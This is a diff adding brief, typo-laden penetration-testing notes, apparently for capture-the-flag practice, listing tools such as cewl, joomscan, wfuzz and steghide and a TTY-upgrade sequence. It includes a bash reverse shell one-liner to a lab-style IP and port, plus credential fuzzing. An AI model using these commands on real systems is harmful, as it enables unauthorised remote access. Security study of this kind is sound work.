@@ -1,0 +1,18 @@
+Cewl - to collect all the words from a webpage to make a workdlist
+joomscan - to scan joomla webpage
+Cyberchec gchq - to extract and detext files and convert eh raw hexdump data
+wfuzz - to fuzz the login credentials and usernames
+
+
+To get working shell with arrows
+python -c 'import tty;tty.spawn("/bin/bash");'
+ctrl z
+stty raw -echo
+f+g+enter
+enter
+
+steghide -  to extract the data from images
+
+reverse shell - bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
+
+
